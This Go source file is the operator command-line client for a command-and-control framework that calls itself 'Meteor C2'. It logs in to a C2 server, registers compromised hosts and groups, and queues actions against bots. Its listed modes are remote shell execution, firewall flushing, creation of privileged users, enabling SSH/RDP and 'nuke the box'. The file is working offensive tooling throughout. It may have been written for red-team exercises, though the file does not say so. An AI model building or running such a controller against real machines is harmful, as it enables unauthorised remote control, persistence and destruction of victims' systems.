package main

import (
	"bufio"
	"bytes"
	"fmt"
	"github.com/degenerat3/meteor/meteor/pbuf"
	"github.com/golang/protobuf/proto"
	"golang.org/x/crypto/ssh/terminal"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"syscall"
)

func login() {
	fmt.Println("LOGIN")
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Username: ")
	un, _ := reader.ReadString('\n')
	un = strings.TrimSuffix(un, "\n")
	un = strings.TrimSuffix(un, "\r")
	DTUSER = un
	fmt.Print("Enter Password: ")
	bytePassword, _ := terminal.ReadPassword(int(syscall.Stdin))
	pw := string(bytePassword)
	fmt.Println()

	authdat := &mcs.AuthDat{
		Username: un,
		Password: pw,
	}
	hostReg1 := &mcs.MCS{
		AuthDat: authdat,
	}
	hdata1, err := proto.Marshal(hostReg1)
	if err != nil {
		panic(err)
	}
	url := "http://" + DTSERVER + "/login"
	resp, err := http.Post(url, "", bytes.NewBuffer(hdata1))
	if err != nil {
		panic(err)
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		panic(err)
	}
	tok := stat.GetDesc()
	if tok == "Invalid user or password" {
		fmt.Println("Error: Invalid username or password")
		os.Exit(0)
	}
	authToken = tok
}

func generateAuthData() *mcs.AuthDat {
	authdat := &mcs.AuthDat{
		Token: authToken,
	}
	return authdat
}

func registerHostReq(host string) {
	hostInfo := strings.Split(host, ":")
	fmt.Printf("Registering host: %s\n", hostInfo[0])
	hostReg := &mcs.MCS{
		Hostname:  hostInfo[0],
		Interface: hostInfo[1],
		AuthDat:   generateAuthData(),
	}
	hdata, err := proto.Marshal(hostReg)
	if err != nil {
		fmt.Println("Error: ", err.Error())
		os.Exit(1)
	}
	url := "http://" + DTSERVER + "/register/host"
	resp, err := http.Post(url, "", bytes.NewBuffer(hdata))
	if err != nil {
		fmt.Println("Error: ", err.Error())
		os.Exit(1)
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		panic(err)
	}
	fmt.Printf("Status: %d\n", stat.GetStatus())
	return
}

func registerGroupReq(group string) {
	groupInfo := strings.Split(group, "--")
	fmt.Printf("Registering group: %s\n", groupInfo[0])
	groupReg := &mcs.MCS{
		Groupname: groupInfo[0],
		Desc:      groupInfo[1],
		AuthDat:   generateAuthData(),
	}
	gdata, _ := proto.Marshal(groupReg)
	url := "http://" + DTSERVER + "/register/group"
	resp, err := http.Post(url, "", bytes.NewBuffer(gdata))
	if err != nil {
		panic(err)
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		panic(err)
	}
	fmt.Printf("Status: %d\n", stat.GetStatus())
	return
}

func registerHostGroupReq(host string, group string) {
	gn := strings.Split(group, "--")[0]
	fmt.Printf("Adding '%s' to the '%s' group\n", host, gn)
	groupReg := &mcs.MCS{
		Groupname: gn,
		Hostname:  host,
		AuthDat:   generateAuthData(),
	}
	gdata, _ := proto.Marshal(groupReg)
	url := "http://" + DTSERVER + "/register/hostgroup"
	resp, err := http.Post(url, "", bytes.NewBuffer(gdata))
	if err != nil {
		panic(err)
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		panic(err)
	}
	fmt.Printf("Status: %d\n", stat.GetStatus())
	return
}

func handleActionKW(splitargs []string) string {
	if len(splitargs) < 3 {
		return "Error: not enough args"
	}
	hst := splitargs[0]
	md := splitargs[1]
	com := strings.Join(splitargs[2:], " ")
	actReg := &mcs.MCS{
		Mode:     md,
		Args:     com,
		Hostname: hst,
		AuthDat:  generateAuthData(),
	}
	bdata, _ := proto.Marshal(actReg)
	url := "http://" + DTSERVER + "/add/action/single"
	resp, err := http.Post(url, "", bytes.NewBuffer(bdata))
	if err != nil {
		return err.Error()
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		return err.Error()
	}
	if stat.GetStatus() != 200 {
		return "Error queuing action" + string(stat.GetStatus())
	}
	return "Successfully queued action '" + stat.GetUuid() + "' targeting: " + hst
}

func handleGroupActionKW(splitargs []string) string {
	if len(splitargs) < 3 {
		return "Error: not enough args"
	}
	grp := splitargs[0]
	md := splitargs[1]
	com := strings.Join(splitargs[2:], " ")
	actReg := &mcs.MCS{
		Mode:      md,
		Args:      com,
		Groupname: grp,
		AuthDat:   generateAuthData(),
	}
	bdata, _ := proto.Marshal(actReg)
	url := "http://" + DTSERVER + "/add/action/group"
	resp, err := http.Post(url, "", bytes.NewBuffer(bdata))
	if err != nil {
		return err.Error()
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		return err.Error()
	}
	if stat.GetStatus() != 200 {
		return "Error queuing action" + string(stat.GetStatus())
	}
	return "Successfully queued actions targeting: " + grp
}

func handleResultKW(splitargs []string) string {
	if len(splitargs) < 1 {
		return "Error: missing argument"
	}
	resReg := &mcs.MCS{
		Uuid:    splitargs[0],
		AuthDat: generateAuthData(),
	}
	bdata, _ := proto.Marshal(resReg)
	url := "http://" + DTSERVER + "/list/result"
	resp, err := http.Post(url, "", bytes.NewBuffer(bdata))
	if err != nil {
		return err.Error()
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		return err.Error()
	}
	if stat.GetStatus() != 200 {
		return "Error querying action"
	}
	return stat.GetDesc()
}

func handleListKW(splitargs []string) string {
	if len(splitargs) < 1 {
		return "Error: missing argument"
	}
	var ret string
	switch splitargs[0] {
	case "modes":
		ret = handleListModes()
	case "hosts":
		ret = handleListHosts()
	case "host":
		ret = handleListHost(splitargs)
	case "groups":
		ret = handleListGroups()
	case "group":
		ret = handleListGroup(splitargs)
	case "bots":
		ret = handleListBots()
	case "actions":
		ret = handleListActions()
	default:
		ret = "Error: Unknown entity '" + splitargs[0] + "', cannot list"
	}
	return ret
}

func handleHelpKW() string {
	ret := fmt.Sprintf(`Daddy_Tops CLI: Interactive Commander for Meteor C2
	
Current Server Config:
Server: %s
User: %s
	
CAPABILITY				SYNTAX
------------------------------------------------------------------------------------------

NEW ACTION:             action <target_hostname> <mode_code> <arguments>
NEW GROUP ACTION:       gaction <target_groupname> <mode_code> <arguments>
SHOW RESULT:            result <uuid>
LIST AVAILABLE <X>:     list <modes/hosts/host/groups/group/bots/actions> <OPT:host/group>
HELP MENU               help
QUIT PROMPT             exit
`, DTSERVER, DTUSER)
	return ret
}

func handleExitKW() string {
	return "Goodbye " + DTUSER + "!\n"
}

func handleListModes() string {
	return `
MODE    DESC                ARGS	
-------------------------------------
  1     shell exec          <shell command>
  2     firewall flush      N/A
  3     create priv user    <username>
  4     enable SSH/RDP      N/A
  F     nuke the box        N/A
`
}

func handleListHosts() string {
	url := "http://" + DTSERVER + "/list/hosts"
	resp, err := http.Get(url)
	if err != nil {
		return err.Error()
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		return err.Error()
	}
	return stat.GetDesc()
}

func handleListHost(splitargs []string) string {
	if len(splitargs) < 2 {
		return "Error: not enough args"
	}
	hst := splitargs[1]
	actReg := &mcs.MCS{
		Hostname: hst,
		AuthDat:  generateAuthData(),
	}
	bdata, _ := proto.Marshal(actReg)
	url := "http://" + DTSERVER + "/list/host"
	resp, err := http.Post(url, "", bytes.NewBuffer(bdata))
	if err != nil {
		return err.Error()
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		return err.Error()
	}
	if stat.GetStatus() != 200 {
		estr := fmt.Sprintf("Error listing host: %d\n", stat.GetStatus())
		return estr
	}
	return stat.GetDesc()
}

func handleListGroups() string {
	url := "http://" + DTSERVER + "/list/groups"
	resp, err := http.Get(url)
	if err != nil {
		return err.Error()
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		return err.Error()
	}
	return stat.GetDesc()
}

func handleListGroup(splitargs []string) string {
	if len(splitargs) < 2 {
		return "Error: not enough args"
	}
	grp := splitargs[1]
	actReg := &mcs.MCS{
		Groupname: grp,
		AuthDat:   generateAuthData(),
	}
	bdata, _ := proto.Marshal(actReg)
	url := "http://" + DTSERVER + "/list/group"
	resp, err := http.Post(url, "", bytes.NewBuffer(bdata))
	if err != nil {
		return err.Error()
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		return err.Error()
	}
	if stat.GetStatus() != 200 {
		estr := fmt.Sprintf("Error listing group: %d\n", stat.GetStatus())
		return estr
	}
	return stat.GetDesc()
}

func handleListBots() string {
	url := "http://" + DTSERVER + "/list/bots"
	resp, err := http.Get(url)
	if err != nil {
		return err.Error()
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		return err.Error()
	}
	return stat.GetDesc()
}

func handleListActions() string {
	url := "http://" + DTSERVER + "/list/actions"
	resp, err := http.Get(url)
	if err != nil {
		return err.Error()
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		return err.Error()
	}
	return stat.GetDesc()
}
